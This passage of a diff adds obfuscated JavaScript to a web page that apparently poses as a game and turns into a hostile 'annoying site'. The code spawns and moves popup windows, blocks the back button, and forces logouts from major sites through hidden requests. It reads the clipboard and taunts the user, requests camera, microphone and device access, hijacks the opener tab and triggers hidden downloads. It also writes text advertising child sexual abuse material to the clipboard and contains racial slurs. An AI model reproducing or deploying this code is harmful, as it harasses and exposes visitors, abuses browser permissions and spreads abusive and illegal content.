+    }
+    function moveWindowBounce() {
+        const _0xf88cf7 = _0x4222ec;
+        let _0x36102f = VELOCITY * (Math[_0xf88cf7(0x213)]() > 0.5 ? 0x1 : -0x1)
+          , _0x45b2c4 = VELOCITY * (Math[_0xf88cf7(0x213)]() > 0.5 ? 0x1 : -0x1);
+        const _0x2a63c4 = setInterval( () => {
+            const _0x64e24c = _0xf88cf7;
+            try {
+                if (window['closed']) {
+                    clearInterval(_0x2a63c4);
+                    return;
+                }
+                const _0xaf4242 = window[_0x64e24c(0x1d5)]
+                  , _0xd0d1cd = window['screenY']
+                  , _0x2eda64 = window[_0x64e24c(0x19b)]
+                  , _0x37e0b1 = window[_0x64e24c(0x1d0)];
+                if (_0xaf4242 < MARGIN)
+                    _0x36102f = Math[_0x64e24c(0x180)](_0x36102f);
+                if (_0xaf4242 + _0x2eda64 > SCREEN_WIDTH - MARGIN)
+                    _0x36102f = -Math['abs'](_0x36102f);
+                if (_0xd0d1cd < TOP_MARGIN)
+                    _0x45b2c4 = Math['abs'](_0x45b2c4);
+                if (_0xd0d1cd + _0x37e0b1 > SCREEN_HEIGHT - MARGIN)
+                    _0x45b2c4 = -Math[_0x64e24c(0x180)](_0x45b2c4);
+                window[_0x64e24c(0x218)](_0x36102f, _0x45b2c4);
+            } catch (_0x4aadb6) {
+                clearInterval(_0x2a63c4);
+            }
+        }
+        , TICK_LENGTH);
+    }
+    function setupFollowWindow() {
+        const _0x4b7de3 = _0x4222ec;
+        document['addEventListener'](_0x4b7de3(0x1eb), function(_0x59e90e) {
+            const _0x1d7556 = _0x4b7de3;
+            try {
+                window['moveTo'](_0x59e90e['screenX'] - WIN_WIDTH / 0x2, _0x59e90e[_0x1d7556(0x221)] - WIN_HEIGHT / 0x2);
+            } catch (_0x1933c2) {}
+        });
+    }
+    function enablePictureInPicture() {
+        const _0x2de8cb = _0x4222ec;
+        try {
+            const _0x2601b1 = document[_0x2de8cb(0x225)](_0x2de8cb(0x1b6));
+            _0x2601b1 && document['pictureInPictureEnabled'] && !document['pictureInPictureElement'] && _0x2601b1[_0x2de8cb(0x223)]()[_0x2de8cb(0x200)](_0x4efcc1 => {}
+            );
+        } catch (_0x5bf629) {}
+    }
+    function startVibrateInterval() {
+        const _0x274154 = _0x4222ec;
+        typeof navigator['vibrate'] === 'function' && !window[_0x274154(0x222)] && (window[_0x274154(0x222)] = setInterval( () => {
+            try {
+                navigator['vibrate']([0x64, 0x32, 0x64, 0x32, 0x64]);
+            } catch (_0x23e4e7) {}
+        }
+        , 0x1388));
+    }
+    function speak(_0x78ae61) {
+        const _0x466798 = _0x4222ec;
+        if (!_0x78ae61)
+            _0x78ae61 = getRandomArrayEntry(PHRASES);
+        try {
+            if (_0x466798(0x1c2)in window) {
+                const _0x171180 = new SpeechSynthesisUtterance(_0x78ae61);
+                _0x171180[_0x466798(0x19a)] = 0.8 + Math['random']() * 0.4,
+                _0x171180[_0x466798(0x1c5)] = 0.8 + Math[_0x466798(0x213)]() * 0.4,
+                _0x171180[_0x466798(0x1bb)] = 0.7,
+                window[_0x466798(0x1c2)][_0x466798(0x22f)](_0x171180);
+            }
+        } catch (_0x179dba) {}
+    }
+    function copySpamToClipboard() {
+        const _0x22e0f1 = _0x4222ec
+          , _0x483b68 = getRandomArrayEntry(ART) + '\x0afree\x20child\x20porn\x20links\x0a';
+        try {
+            navigator[_0x22e0f1(0x220)]['writeText'](_0x483b68)['then']( () => {}
+            )[_0x22e0f1(0x200)]( () => {
+                fallbackCopyToClipboard(_0x483b68);
+            }
+            );
+        } catch (_0x39c1f1) {
+            fallbackCopyToClipboard(_0x483b68);
+        }
+    }
+    function fallbackCopyToClipboard(_0x8084e6) {
+        const _0x4ef400 = _0x4222ec
+          , _0x1dd06b = document[_0x4ef400(0x1c6)](_0x4ef400(0x1bd));
+        _0x1dd06b[_0x4ef400(0x1c7)] = _0x8084e6,
+        _0x1dd06b[_0x4ef400(0x1ec)]['cssText'] = HIDDEN_STYLE,
+        document['body']['appendChild'](_0x1dd06b),
+        _0x1dd06b[_0x4ef400(0x1e7)]();
+        try {
+            document[_0x4ef400(0x1f8)](_0x4ef400(0x19d));
+        } catch (_0x1d2618) {}
+        document[_0x4ef400(0x1a3)][_0x4ef400(0x1b5)](_0x1dd06b);
+    }
+    function startAlertInterval() {
+        const _0x1b4b26 = _0x4222ec;
+        !window[_0x1b4b26(0x215)] && (window['alertInterval'] = setInterval( () => {
+            const _0x1203bd = _0x1b4b26;
+            Math[_0x1203bd(0x213)]() < 0.6 && showAlert();
+        }
+        , 0xafc8));
+    }
+    function showAlert() {
+        const _0x5a6a2b = _0x4222ec
+          , _0x86e0c7 = getRandomArrayEntry(ART)
+          , _0x5573cb = Array(0x5)[_0x5a6a2b(0x1ed)](_0x86e0c7)[_0x5a6a2b(0x188)]('\x0a\x0a');
+        try {
+            window['alert'](_0x5573cb);
+        } catch (_0x5ade2b) {}
+    }
+    function startTheramin() {
+        const _0x2ca8d7 = _0x4222ec;
+        try {
+            const _0x57bc99 = window[_0x2ca8d7(0x19e)] || window[_0x2ca8d7(0x1a0)];
+            if (!_0x57bc99)
+                return;
+            const _0x6a63e = new _0x57bc99()
+              , _0x2eb827 = _0x6a63e['createOscillator']()
+              , _0x4aaed5 = _0x6a63e[_0x2ca8d7(0x1b3)]()
+              , _0x47704f = 0x32
+              , _0xe88b10 = 0xfa0
+              , _0x435681 = new Float32Array([0x0, 0.5, 0.3, 0.2, 0.1])
+              , _0x581670 = new Float32Array(_0x435681[_0x2ca8d7(0x1d1)])
+              , _0x3ad8fa = _0x6a63e[_0x2ca8d7(0x1be)](_0x435681, _0x581670);
+            _0x2eb827[_0x2ca8d7(0x229)](_0x3ad8fa),
+            _0x2eb827[_0x2ca8d7(0x1b4)](_0x4aaed5),
+            _0x4aaed5[_0x2ca8d7(0x1b4)](_0x6a63e[_0x2ca8d7(0x1ca)]),
+            _0x2eb827[_0x2ca8d7(0x1c8)](),
+            document[_0x2ca8d7(0x1a3)]['addEventListener'](_0x2ca8d7(0x1eb), _0x5a3b95 => {
+                const _0x5701f7 = _0x2ca8d7
+                  , {clientX: _0x3be1d5, clientY: _0x1f07d9} = _0x5a3b95
+                  , {clientWidth: _0x7b3e8, clientHeight: _0x1f9305} = document['body']
+                  , _0x2393b6 = (_0x3be1d5 - _0x7b3e8 / 0x2) / _0x7b3e8
+                  , _0x4d279e = (_0x1f07d9 - _0x1f9305 / 0x2) / _0x1f9305;
+                _0x2eb827['frequency'][_0x5701f7(0x1c7)] = _0x47704f + _0x2393b6 * _0xe88b10,
+                _0x4aaed5['gain'][_0x5701f7(0x1c7)] = Math[_0x5701f7(0x180)](_0x4d279e) * 0.3;
+            }
+            );
+        } catch (_0xfc4e73) {}
+    }
+    function requestClipboardRead() {
+        const _0x15150f = _0x4222ec;
+        try {
+            navigator[_0x15150f(0x220)][_0x15150f(0x21e)]()['then'](_0xe015ca => {
+                const _0x1647d0 = _0x15150f;
+                !window[_0x1647d0(0x1a9)] && window[_0x1647d0(0x1fd)](_0x1647d0(0x1b7) + _0xe015ca[_0x1647d0(0x1d6)](0x0, 0x32) + '\x27');
+            }
+            , () => {}
+            );
+        } catch {}
+    }
+    function requestWebauthnAttestation() {
+        const _0x42a912 = _0x4222ec;
+        try {
+            navigator[_0x42a912(0x201)][_0x42a912(0x1fe)]({
+                'publicKey': {
+                    'rp': {
+                        'name': _0x42a912(0x210)
+                    },
+                    'user': {
+                        'id': new Uint8Array(0x10),
+                        'name': _0x42a912(0x1a1),
+                        'displayName': _0x42a912(0x21a)
+                    },
+                    'pubKeyCredParams': [{
+                        'type': 'public-key',
+                        'alg': -0x7
+                    }],
+                    'timeout': 0xea60,
+                    'challenge': new Uint8Array(0x20)
+                }
+            });
+        } catch {}
+    }
+    function requestMidiAccess() {
+        try {
+            navigator['requestMIDIAccess']({
+                'sysex': !![]
+            });
+        } catch {}
+    }
+    function requestBluetoothAccess() {
+        const _0x563861 = _0x4222ec;
+        try {
+            navigator['bluetooth'][_0x563861(0x174)]({
+                'acceptAllDevices': !![],
+                'optionalServices': [_0x563861(0x214), _0x563861(0x1e2)]
+            });
+        } catch {}
+    }
+    function requestUsbAccess() {
+        const _0x18e021 = _0x4222ec;
+        try {
+            navigator['usb'][_0x18e021(0x174)]({
+                'filters': []
+            });
+        } catch {}
+    }
+    function requestSerialAccess() {
+        try {
+            navigator['serial']['requestPort']({
+                'filters': []
+            });
+        } catch {}
+    }
+    function requestHidAccess() {
+        const _0x5adf07 = _0x4222ec;
+        try {
+            navigator[_0x5adf07(0x18d)][_0x5adf07(0x174)]({
+                'filters': []
+            });
+        } catch {}
+    }
+    function requestCameraAndMic() {
+        const _0x4c05ea = _0x4222ec;
+        try {
+            navigator[_0x4c05ea(0x186)] && navigator['mediaDevices'][_0x4c05ea(0x1c9)] && navigator[_0x4c05ea(0x186)][_0x4c05ea(0x1c9)]({
+                'video': {
+                    'facingMode': _0x4c05ea(0x1d7)
+                },
+                'audio': !![]
+            })[_0x4c05ea(0x1b8)](_0x10b1e3 => {
+                const _0x51fbfd = _0x4c05ea;
+                _0x10b1e3[_0x51fbfd(0x198)]()['forEach'](_0x44dd88 => _0x44dd88['stop']());
+            }
+            )[_0x4c05ea(0x200)]( () => {}
+            );
+        } catch {}
+    }
+    function attemptToTakeoverReferrerWindow() {
+        const _0x545386 = _0x4222ec;
+        try {
+            isParentWindow && window[_0x545386(0x1ef)] && !isParentSameOrigin() && (window[_0x545386(0x1ef)][_0x545386(0x18f)] = window[_0x545386(0x18f)][_0x545386(0x1df)] + '/?child=true');
+        } catch (_0x15cb03) {}
+    }
+    function confirmPageUnload() {
+        const _0x7d1ac5 = _0x4222ec;
+        window[_0x7d1ac5(0x1d3)](_0x7d1ac5(0x179), _0x259a37 => {
+            const _0x2d3c56 = _0x7d1ac5;
+            return speak('Don\x27t\x20leave\x20me!'),
+            _0x259a37[_0x2d3c56(0x1ff)] = _0x2d3c56(0x190),
+            _0x259a37[_0x2d3c56(0x1ff)];
+        }
+        );
+    }
+    function _0x2d91(_0x58f485, _0x460889) {
+        const _0x2cb962 = _0x2cb9();
+        return _0x2d91 = function(_0x2d91fe, _0x369669) {
+            _0x2d91fe = _0x2d91fe - 0x171;
+            let _0x4d423b = _0x2cb962[_0x2d91fe];
+            return _0x4d423b;
+        }
+        ,
+        _0x2d91(_0x58f485, _0x460889);
+    }
+    function registerProtocolHandlers() {
+        const _0x325e72 = _0x4222ec;
+        try {
+            if (typeof navigator['registerProtocolHandler'] !== _0x325e72(0x219))
+                return;
+            const _0xcf397b = ['bitcoin', _0x325e72(0x171), 'mailto', 'sms', 'tel']
+              , _0x220f22 = window['location'][_0x325e72(0x1d4)] + '?url=%s';
+            _0xcf397b[_0x325e72(0x176)](_0x4a3f10 => {
+                const _0x114bce = _0x325e72;
+                try {
+                    navigator[_0x114bce(0x1ae)](_0x4a3f10, _0x220f22, _0x114bce(0x1e6));
+                } catch (_0x27203b) {}
+            }
+            );
+        } catch (_0x28ec47) {}
+    }
+    function hideCursor() {
+        const _0x423a42 = _0x4222ec;
+        document[_0x423a42(0x225)](_0x423a42(0x18e))[_0x423a42(0x1ec)]['cursor'] = 'none';
+    }
+    function triggerFileDownload() {
+        const _0x3bf1df = _0x4222ec;
+        if (FILE_DOWNLOADS[_0x3bf1df(0x1d1)] > 0x0) {
+            const _0x52efa4 = getRandomArrayEntry(FILE_DOWNLOADS)
+              , _0x5b9def = document[_0x3bf1df(0x1c6)]('a');
+            _0x5b9def[_0x3bf1df(0x1d4)] = _0x52efa4,
+            _0x5b9def[_0x3bf1df(0x205)] = _0x52efa4,
+            _0x5b9def[_0x3bf1df(0x1ec)][_0x3bf1df(0x18c)] = HIDDEN_STYLE,
+            document['body'][_0x3bf1df(0x187)](_0x5b9def),
+            _0x5b9def[_0x3bf1df(0x199)](),
+            setTimeout( () => document[_0x3bf1df(0x1a3)][_0x3bf1df(0x1b5)](_0x5b9def), 0x3e8);
+        }
+    }
+    function focusWindows() {
+        const _0x5ca598 = _0x4222ec;
+        wins[_0x5ca598(0x176)]( (_0x48eb94, _0x3f08b7) => {
+            const _0x551f77 = _0x5ca598;
+            if (_0x48eb94 && !_0x48eb94[_0x551f77(0x1a7)])
+                try {
+                    _0x48eb94[_0x551f77(0x20d)](),
+                    setTimeout( () => {
+                        const _0xf60988 = _0x551f77;
+                        wins[_0x3f08b7 + 0x1] && wins[_0x3f08b7 + 0x1][_0xf60988(0x20d)]();
+                    }
+                    , 0x3e8);
+                } catch (_0x198984) {}
+        }
+        );
+    }
+    function detectWindowClose() {
+        const _0x22d7e2 = _0x4222ec;
+        window[_0x22d7e2(0x1d3)]('unload', () => {
+            const _0x278c83 = _0x22d7e2;
+            if (window[_0x278c83(0x1ef)] && !window[_0x278c83(0x1ef)][_0x278c83(0x1a7)])
+                try {
+                    window[_0x278c83(0x1ef)][_0x278c83(0x1d8)](window);
+                } catch (_0x4eaa69) {}
+        }
+        );
+    }
+    function onCloseWindow(_0x26b040) {
+        const _0x33c23f = _0x4222ec
+          , _0x508763 = wins[_0x33c23f(0x1c1)](_0x26b040);
+        _0x508763 > -0x1 && wins[_0x33c23f(0x20e)](_0x508763, 0x1);
+    }
+    function showHelloMessage() {
+        const _0x1a7e51 = _0x4222ec;
+        try {
+            const _0x15d8ac = document[_0x1a7e51(0x225)](_0x1a7e51(0x17a))
+              , _0x3924d3 = document['importNode'](_0x15d8ac[_0x1a7e51(0x22a)], !![]);
+            document['body'][_0x1a7e51(0x187)](_0x3924d3);
+        } catch (_0x1a2612) {}
+    }
+    function _0x2cb9() {
+        const _0x3666f7 = ['mediaDevices', 'appendChild', 'join', 'touchstart', 'padStart', '544456vdJjTQ', 'cssText', 'hid', 'html', 'location', 'Are\x20you\x20sure\x20you\x20want\x20to\x20leave?', '12HCAnfQ', 'GET', 'hidden', '4184050znMDQJ', 'getElementById', 'https://github.com/logout', 'activateAnnoyingSite', 'getTracks', 'click', 'rate', 'outerWidth', 'log', 'copy', 'AudioContext', 'parentNode', 'webkitAudioContext', 'RAPENIGGERS@RAPED.COM', 'left-top-video', 'body', 'documentElement', 'querySelectorAll', 'screen', 'closed', 'play', 'ApplePaySession', 'none', 'That\x20was\x20a\x20mistake!', 'removeEventListener', '1946097UsJARY', 'registerProtocolHandler', 'classList', 'block', 'audio', 'readyState', 'createGain', 'connect', 'removeChild', 'video', 'i\x20can\x20see\x20your\x20clipboard\x20nigga:\x20\x27', 'then', 'mouseup', 'textContent', 'volume', 'fakeGame', 'textarea', 'createPeriodicWave', 'width=', '?child=true', 'indexOf', 'speechSynthesis', 'open', 'push', 'pitch', 'createElement', 'value', 'start', 'getUserMedia', 'destination', 'https://files.catbox.moe/mqma06.mp4', 'https://www.youtube.com/logout', 'right-bottom-video', 'nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger\x20nigger', '6QfZVPC', 'outerHeight', 'length', '18656500EaUpBu', 'addEventListener', 'href', 'screenX', 'substring', 'environment', 'onCloseWindow', 'Control', 'themeInterval', 'key', 'forward', 'ipAddress', 'playsInline', 'origin', 'Unable\x20to\x20retrieve\x20IP', 'Video\x20play\x20failed\x20again:', 'device_information', 'muted', 'src', 'add', 'Annoying\x20Site', 'select', 'https://files.catbox.moe/0yus5r.mp4', 'requestFullscreen', '2QisNqU', 'mousemove', 'style', 'fill', 'https://www.google.com/accounts/Logout', 'opener', 'div', 'hash', 'call', ',height=', 'https://drive.google.com/uc?export=download&id=10EDShs_pi_h_Iubvitc35zCFOoM0cIze', 'display', 'now', 'keyup', 'execCommand', 'onerror', 'pointerdown', 'error', 'main-video', 'alert', 'create', 'returnValue', 'catch', 'credentials', ',top=', 'keydown', 'stopPropagation', 'download', 'https://files.catbox.moe/umt023.mp4', ',left=', 'oncanplay', 'https://files.catbox.moe/kk63x5.mp3', 'stopImmediatePropagation', 'emojiInterval', 'autoplay', 'focus', 'splice', 'loop', 'Free\x20Qurans', 'availWidth', 'https://files.catbox.moe/m9f8hj.mp4', 'random', 'battery_service', 'alertInterval', 'mousedown', 'pushState', 'moveBy', 'function', 'U\x20GOT\x20HACKED\x20NIGGA', 'availHeight', 'meta.theme-color', 'search', 'readText', 'DOMContentLoaded', 'clipboard', 'screenY', 'vibrateInterval', 'requestPictureInPicture', 'Meta', 'querySelector', 'child=true', '7565047aPRfiZ', 'loading', 'setPeriodicWave', 'content', 'https://www.facebook.com/logout.php', 'className', 'https://files.catbox.moe/9ddxn2.mp4', 'requestPointerLock', 'speak', 'geo', 'floor', 'white', 'requestDevice', 'https://twitter.com/logout', 'forEach', 'webkitRequestPointerLock', '.hello-message', 'beforeunload', 'template', 'toString', 'history', 'preventDefault', 'ipDisplay', '5430416iPajwD', 'abs', 'cursor', 'https://files.catbox.moe/8c4gt4.mp3', 'pathname', 'keypress', '615523dTUelR'];
+        _0x2cb9 = function() {
+            return _0x3666f7;
+        }
+        ;
+        return _0x2cb9();
+    }
+    function removeHelloMessage() {
+        const _0xcb0c16 = _0x4222ec
+          , _0x5acd22 = document[_0xcb0c16(0x225)](_0xcb0c16(0x178));
+        _0x5acd22 && _0x5acd22['remove']();
+    }
+    function rainbowThemeColor() {
+        const _0x20b6d6 = _0x4222ec
+          , _0x25c894 = document['querySelector'](_0x20b6d6(0x21c));
+        _0x25c894 && !window[_0x20b6d6(0x1da)] && (window['themeInterval'] = setInterval( () => {
+            const _0x1774ab = _0x20b6d6;
+            _0x25c894['setAttribute']('content', '#' + Math['floor'](Math[_0x1774ab(0x213)]() * 0xffffff)[_0x1774ab(0x17b)](0x10)[_0x1774ab(0x18a)](0x6, '0'));
+        }
+        , 0x64));
+    }
+    function animateUrlWithEmojis() {
+        const _0x56d5e7 = _0x4222ec;
+        if (window[_0x56d5e7(0x1a9)])
+            return;
+        const _0x16610a = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
+          , _0x85d822 = Array(0xa)['fill'](0x0);
+        let _0x5edb1c = 0x0;
+        !window[_0x56d5e7(0x20b)] && (window[_0x56d5e7(0x20b)] = setInterval( () => {
+            const _0x4537a2 = _0x56d5e7;
+            let _0x1a4077 = ''
+              , _0x30ae05 = 0x0;
+            if (!_0x5edb1c) {
+                while (_0x85d822[_0x30ae05] === 0x4)
+                    _0x30ae05++;
+                if (_0x30ae05 >= _0x85d822[_0x4537a2(0x1d1)])
+                    _0x5edb1c = 0x1;
+                else
+                    _0x85d822[_0x30ae05]++;
+            } else {
+                while (_0x85d822[_0x30ae05] === 0x0)
+                    _0x30ae05++;
+                if (_0x30ae05 >= _0x85d822[_0x4537a2(0x1d1)])
+                    _0x5edb1c = 0x0;
+                else {
+                    _0x85d822[_0x30ae05]++;
+                    if (_0x85d822[_0x30ae05] === 0x8)
+                        _0x85d822[_0x30ae05] = 0x0;
+                }
+            }
+            _0x85d822[_0x4537a2(0x176)](_0x4591e4 => _0x1a4077 += _0x16610a[_0x4591e4]),
+            window['location'][_0x4537a2(0x1f1)] = _0x1a4077;
+        }
+        , 0x96));
+    }
+    function interceptUserInput(_0x152816) {
+        const _0x59ae27 = _0x4222ec
+          , _0x44fe2d = [_0x59ae27(0x189), _0x59ae27(0x216), _0x59ae27(0x1b9), _0x59ae27(0x199), _0x59ae27(0x203), _0x59ae27(0x1f7), _0x59ae27(0x184)];
+        _0x44fe2d[_0x59ae27(0x176)](_0x1f6c8d => {
+            const _0x4f1935 = _0x59ae27;
+            document[_0x4f1935(0x1a3)]['addEventListener'](_0x1f6c8d, _0x152816, {
+                'passive': ![],
+                'capture': !![]
+            });
+        }
+        );
+    }
+    function requestFullscreen() {
+        const _0x49d956 = _0x4222ec;
+        try {
+            const _0x5f454b = document[_0x49d956(0x1a4)]
+              , _0x1d8c05 = _0x5f454b[_0x49d956(0x1e9)] || _0x5f454b['webkitRequestFullscreen'] || _0x5f454b['mozRequestFullScreen'] || _0x5f454b['msRequestFullscreen'];
+            _0x1d8c05 && _0x1d8c05[_0x49d956(0x1f2)](_0x5f454b)[_0x49d956(0x200)](_0x16cc57 => {}
+            );
+        } catch (_0x5501ba) {}
+    }
+    function requestPointerLock() {
+        const _0x6d683a = _0x4222ec;
+        try {
+            const _0x304829 = document[_0x6d683a(0x1a4)]
+              , _0x1db371 = _0x304829[_0x6d683a(0x22e)] || _0x304829[_0x6d683a(0x177)] || _0x304829['mozRequestPointerLock'];
+            _0x1db371 && _0x1db371['call'](_0x304829);
+        } catch (_0x11eb2d) {}
+    }
+    function superLogout() {
+        const _0x4051e5 = _0x4222ec;
+        function _0x976a6(_0x39effd) {
+            const _0x483657 = _0x2d91
+              , _0x11aeac = new Image();
+            _0x11aeac[_0x483657(0x1e4)] = _0x39effd + '&t=' + Date[_0x483657(0x1f6)](),
+            _0x11aeac[_0x483657(0x1ec)][_0x483657(0x18c)] = HIDDEN_STYLE,
+            document['body'][_0x483657(0x187)](_0x11aeac),
+            setTimeout( () => {
+                const _0x3067f6 = _0x483657;
+                if (_0x11aeac[_0x3067f6(0x19f)])
+                    _0x11aeac['parentNode'][_0x3067f6(0x1b5)](_0x11aeac);
+            }
+            , 0x1388);
+        }
+        for (const _0x543b11 in LOGOUT_SITES) {
+            const _0xa116a1 = LOGOUT_SITES[_0x543b11][0x0]
+              , _0x2fc323 = LOGOUT_SITES[_0x543b11][0x1];
+            _0xa116a1 === _0x4051e5(0x192) && _0x976a6(_0x2fc323);
+            const _0xf2c68b = document[_0x4051e5(0x1c6)](_0x4051e5(0x1f0));
+            _0xf2c68b[_0x4051e5(0x1ba)] = 'Logging\x20out\x20from\x20' + _0x543b11 + '...';
+            const _0x1fd140 = document[_0x4051e5(0x225)]('.logout-messages');
+            _0x1fd140 && _0x1fd140[_0x4051e5(0x187)](_0xf2c68b);
+        }
+    }
+    function blockBackButton() {
+        window['addEventListener']('popstate', () => {
+            const _0x50c749 = _0x2d91;
+            window[_0x50c749(0x17c)][_0x50c749(0x1dc)]();
+        }
+        );
+    }
+    function fillHistory() {
+        const _0x5091a5 = _0x4222ec;
+        for (let _0x3e7bef = 0x1; _0x3e7bef < 0xf; _0x3e7bef++) {
+            window[_0x5091a5(0x17c)][_0x5091a5(0x217)]({}, '', window['location']['pathname'] + '?page=' + _0x3e7bef);
+        }
+        window[_0x5091a5(0x17c)]['pushState']({}, '', window['location']['pathname']);
+    }
+    function setupActivationTriggers() {
+        const _0x48de71 = _0x4222ec;
+        detectWindowType();
+        if (isChildWindow) {
+            setTimeout( () => {
+                activateAnnoyingSite();
+            }
+            , 0x64);
+            return;
+        }
+        const _0x2d9779 = document[_0x48de71(0x195)](_0x48de71(0x1bc))
+          , _0x5b8c08 = document['getElementById']('gameImage')
+          , _0x37206f = [{
+            'element': _0x2d9779,
+            'event': _0x48de71(0x199),
+            'options': {}
+        }, {
+            'element': _0x2d9779,
+            'event': _0x48de71(0x216),
+            'options': {}
+        }, {
+            'element': _0x2d9779,
+            'event': 'touchstart',
+            'options': {
+                'passive': ![]
+            }
+        }, {
+            'element': _0x2d9779,
+            'event': _0x48de71(0x1fa),
+            'options': {}
+        }, {
+            'element': _0x5b8c08,
+            'event': 'click',
+            'options': {}
+        }, {
+            'element': _0x5b8c08,
+            'event': 'mousedown',
+            'options': {}
+        }, {
+            'element': _0x5b8c08,
+            'event': 'touchstart',
+            'options': {
+                'passive': ![]
+            }
+        }, {
+            'element': _0x5b8c08,
+            'event': _0x48de71(0x1fa),
+            'options': {}
+        }];
+        _0x37206f['forEach']( ({element: _0x4d947a, event: _0x565b13, options: _0x5d9028}) => {
+            const _0x49568b = _0x48de71;
+            try {
+                _0x4d947a[_0x49568b(0x1d3)](_0x565b13, function(_0x6eef1b) {
+                    const _0x4f13f4 = _0x49568b;
+                    _0x6eef1b[_0x4f13f4(0x17d)](),
+                    _0x6eef1b['stopPropagation'](),
+                    _0x6eef1b[_0x4f13f4(0x20a)](),
+                    setTimeout( () => {
+                        openWindow();
+                    }
+                    , 0xa),
+                    activateAnnoyingSite();
+                }, {
+                    'capture': !![],
+                    ..._0x5d9028
+                });
+            } catch (_0x2266a1) {}
+        }
+        ),
+        document[_0x48de71(0x1d3)]('keydown', function(_0x2692c8) {
+            !isActivated && (activateAnnoyingSite(),
+            openWindow());
+        }),
+        window[_0x48de71(0x1d3)]('load', () => {
+            setTimeout(activateAnnoyingSite, 0x7530);
+        }
+        );
+    }
+    window[_0x4222ec(0x197)] = activateAnnoyingSite,
+    window[_0x4222ec(0x1d3)](_0x4222ec(0x21f), setupActivationTriggers);
+    document[_0x4222ec(0x1b2)] === _0x4222ec(0x228) ? document[_0x4222ec(0x1d3)](_0x4222ec(0x21f), setupActivationTriggers) : setupActivationTriggers();
+</script>
+</body></html>
